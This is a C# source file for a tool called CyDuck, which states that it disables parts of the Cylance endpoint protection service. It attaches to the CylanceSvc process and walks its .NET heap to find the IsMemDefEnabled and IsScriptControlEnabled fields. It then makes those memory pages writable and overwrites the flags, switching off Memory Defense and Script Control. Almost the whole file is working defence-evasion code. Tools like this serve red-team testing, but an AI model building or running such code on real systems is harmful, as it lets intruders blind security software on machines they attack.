using System;
using System.Collections.Generic;
using Microsoft.Diagnostics.Runtime;
using NDesk.Options;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.ComponentModel;

/// <summary>
/// Author: Chris Ross @xorrior
/// Purpose: .NET application that will enumerate and disable various components of the CylanceSvc service.
/// License: BSD-3 Clause
/// </summary>

namespace CyDuck
{
    public class Program
    {
        public static void Main(string[] args)
        {
            OptionSet opts = new OptionSet()
            {
                {"p=|pid=","ProcessId of the CylanceSvc", (int v) =>  targetPID = v},
                {"DisableMemDef","Disable Cylance Memory Defense", v => disarmMemDef = v != null },
                {"DisableScriptControl", "Disable Cylance Script Control", v => disarmScriptCntrl = v != null },
                {"help", "Show the help menu", v => help = v != null }
            };


            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if(help || targetPID == 0)
            {
                Console.WriteLine("Usage: CyDuck.exe [options]");
                Console.WriteLine("Copyright (c) Chris Ross 2017. Licensed under BSD-3 Clause");
                Console.WriteLine("Options:\r\n");
                opts.WriteOptionDescriptions(Console.Error);
                System.Environment.Exit(0);
            }

            if (!IsAdmin())
            {
                Console.WriteLine("Administratrive Privileges needed for disabling Memory Defense and Script Control");
                System.Environment.Exit(0);
            }

            if (disarmMemDef)
                CylanceMemDefDisabled = DisableMD(targetPID);
            else if (disarmScriptCntrl)
                CylanceScriptControlDisabled = DisableScriptControl(targetPID);

            Console.WriteLine("Memory Defense Disabled: " + CylanceMemDefDisabled.Key);
            Console.WriteLine(CylanceMemDefDisabled.Value);

            Console.WriteLine("Script Control Disabled: " + CylanceScriptControlDisabled.Key);
            Console.WriteLine(CylanceScriptControlDisabled.Value);

            dt.Dispose();
            Process.LeaveDebugMode();
    }

        //helper function to check for admin privs
        private static bool IsAdmin()
        {
            WindowsPrincipal principal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static KeyValuePair<bool, string> DisableScriptControl(int pid)
        {
            //Get SeDebug Privilege
            Process.EnterDebugMode();

            // attach to CylanceSvc process and locate the IsScriptControlEnabled field
            try
            {
#if DEBUG 
                Console.WriteLine("Attaching to process with pid: " + targetPID);
#endif
                dt = DataTarget.AttachToProcess(pid, 10000, AttachFlag.NonInvasive);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                return new KeyValuePair<bool, string>(false, e.ToString());
            }

            //If no ClrVersions, exit
            if (dt.ClrVersions.Count == 0)
                return new KeyValuePair<bool, string>(false, "No Clr Versions detected");

#if DEBUG
            foreach (var ver in dt.ClrVersions)
            {
                Console.WriteLine("Clr Runtime Version Found: " + ver.Version.ToString());
            }
#endif
            ClrInfo ClrVersion = dt.ClrVersions[0];

            ClrRuntime cRun = ClrVersion.CreateRuntime();

            ClrHeap Heap = cRun.GetHeap();

            try
            {
                KeyValuePair<ClrInstanceField, string> res = GetField("IsScriptControlEnabled", "Cylance.Host.MemDef.MemDef", Heap);

                if (res.Key == null)
                    return new KeyValuePair<bool, string>(false, res.Value);

                ClrInstanceField field = res.Key;
                Console.WriteLine("IsScriptControlEnabled -> Protected: " + field.IsProtected.ToString());
                Console.WriteLine("IsScriptControlEnabled -> HasSimpleValue: " + field.HasSimpleValue.ToString());
                Console.WriteLine("IsScriptControlEnabled -> Offset: " + field.Offset.ToString("X8"));
                Console.WriteLine("IsScriptControlEnabled -> Memory Address: " + fieldAddr.ToInt64().ToString("X8"));
                Console.WriteLine("IsScriptControlEnabled -> Value: " + fieldValue.ToString());

                //Now that we have an address for the field, change it :)

                IntPtr hProcess = OpenProcess(allAccess, false, targetPID);
                if (hProcess == IntPtr.Zero || hProcess == null)
                    return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);
#if DEBUG
                Console.WriteLine("Obtained process handle " + hProcess.ToString("X8"));
#endif

                bool en = false;
                byte[] buf = new byte[] { Convert.ToByte(en) };
                return WriteToProcess(hProcess, buf, fieldAddr);
            }
            catch (Exception e)
            {
                return new KeyValuePair<bool, string>(false, e.ToString());
            }
            

            
        }

        //Disable Memory Defense Primary function
        private static KeyValuePair<bool, string> DisableMD(int pid)
        {
            //Get SeDebug Privilege
            Process.EnterDebugMode();

            // attach to CylanceSvc process and locate the field we want to change
            try
            {
#if DEBUG
                Console.WriteLine("Attaching to target process with pid: " + pid);
#endif
                dt = DataTarget.AttachToProcess(pid, 10000, AttachFlag.NonInvasive);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                return new KeyValuePair<bool, string>(false, e.ToString());
            }

            //If no ClrVersions, exit
            if (dt.ClrVersions.Count == 0)
                return new KeyValuePair<bool, string>(false, "No Clr Versions detected");

#if DEBUG
            foreach (var ver in dt.ClrVersions)
            {
                Console.WriteLine("Clr Runtime Version Found: " + ver.Version.ToString());
            }
#endif
            ClrInfo ClrVersion = dt.ClrVersions[0];

            ClrRuntime cRun = ClrVersion.CreateRuntime();

            ClrHeap Heap = cRun.GetHeap();

            try
            {

                KeyValuePair<ClrInstanceField, string> res = GetField("IsMemDefEnabled", "Cylance.Host.MemDef.MemDef", Heap);
                if (res.Key == null)
                    return new KeyValuePair<bool, string>(false, res.Value);

                ClrInstanceField field = res.Key;
                Console.WriteLine("IsMemDefEnabled -> Protected: " + field.IsProtected.ToString());
                Console.WriteLine("IsMemDefEnabled -> HasSimpleValue: " + field.HasSimpleValue.ToString());
                Console.WriteLine("IsMemDefEnabled -> Offset: " + field.Offset.ToString("X8"));
                Console.WriteLine("IsMemDefEnabled -> Memory Address: " + fieldAddr.ToInt64().ToString("X8"));
                Console.WriteLine("IsMemDefEnabled -> Value: " + fieldValue.ToString());


                //Now that we have an address for the field, change it :)
                
                IntPtr hProcess = OpenProcess(allAccess, false, targetPID);
                if (hProcess == IntPtr.Zero || hProcess == null)
                    return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);
#if DEBUG
                Console.WriteLine("Obtained process handle " + hProcess.ToString("X8"));
#endif

                bool en = false;
                byte[] buf = new byte[] { Convert.ToByte(en) };
                return WriteToProcess(hProcess, buf, fieldAddr);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine(e.ToString());
#endif
                return new KeyValuePair<bool, string>(false, e.ToString());
            }
        }

        //Write to remote process
        private static KeyValuePair<bool, string> WriteToProcess(IntPtr hProcess, byte[] value, IntPtr address)
        {

            uint oldProt = 0;
            if (!VirtualProtectEx(hProcess, fieldAddr, (uint)value.Length, 0x04, out oldProt))
                return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);

            int bytesWritten = 0;
            if (!WriteProcessMemory(hProcess, fieldAddr, value, value.Length, ref bytesWritten))
                return new KeyValuePair<bool, string>(false, new Win32Exception(Marshal.GetLastWin32Error()).Message);
#if DEBUG
            Console.WriteLine("Successfully wrote " + bytesWritten.ToString() + " byte/s to the target process");
#endif
            CloseHandle(hProcess);
            return new KeyValuePair<bool, string>(true, "Success");
        }

        private static KeyValuePair<ClrInstanceField, string> GetField(string fieldName, string typeName, ClrHeap Heap)
        {
            //helper function to get an instance field
            if (!Heap.CanWalkHeap)
                return new KeyValuePair<ClrInstanceField, string>(null, "[!] Unable to walk the heap");

            Console.WriteLine("[+] Walking the heap....");
            foreach (ulong obj in Heap.EnumerateObjectAddresses())
            {
                ClrType type = Heap.GetObjectType(obj);

                if (type == null || type.Name != typeName)
                    continue;

                try
                {
                    ClrInstanceField field = type.GetFieldByName(fieldName);
#if DEBUG
                    Console.WriteLine("[+] Found desired field: " + fieldName);
#endif
                    ulong a = field.GetAddress(obj);
                    if(field.HasSimpleValue)
                        fieldValue = field.GetValue(obj);

                    fieldAddr = new IntPtr(long.Parse(a.ToString()));
                    return new KeyValuePair<ClrInstanceField, string>(field, "[+] Found field " + fieldName);
                }
                catch (Exception e)
                {
                    return new KeyValuePair<ClrInstanceField, string>(null, e.ToString());
                }
                
            }

            return new KeyValuePair<ClrInstanceField, string>(null, "Unable to locate field: " + fieldName);
        }

        //helper functions for regex strings
        private static string WildCardToRegular(string value)
        {
            return "^" + Regex.Escape(value).Replace("\\*", ".*") + "$";
        }

        private static string WildCardToRegWithQM(string value)
        {
            return "^" + Regex.Escape(value).Replace("\\?", ".").Replace("\\*", ".*") + "$";
        }

        private static int targetPID = 0;
        private static bool enumerate;
        private static bool disarmMemDef;
        private static bool disarmScriptCntrl;
        private static bool help;
        public static KeyValuePair<bool, string> CylanceMemDefDisabled;
        public static KeyValuePair<bool, string> CylanceScriptControlDisabled;
        private static DataTarget dt = null;
        private static IntPtr fieldAddr;
        private static object fieldValue;

        private static uint allAccess = (0x000F0000 | 0x00100000 | 0xFFF);

        //private const uint VM_CREATE_THREAD = 0x00000002;
        private const uint VM_OPERATION = 0x00000008;
        private const uint VM_READ = 0x00000010;
        private const uint VM_WRITE = 0x00000020;
        private const uint VM_QUERY = 0x00000400;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);
    }
}
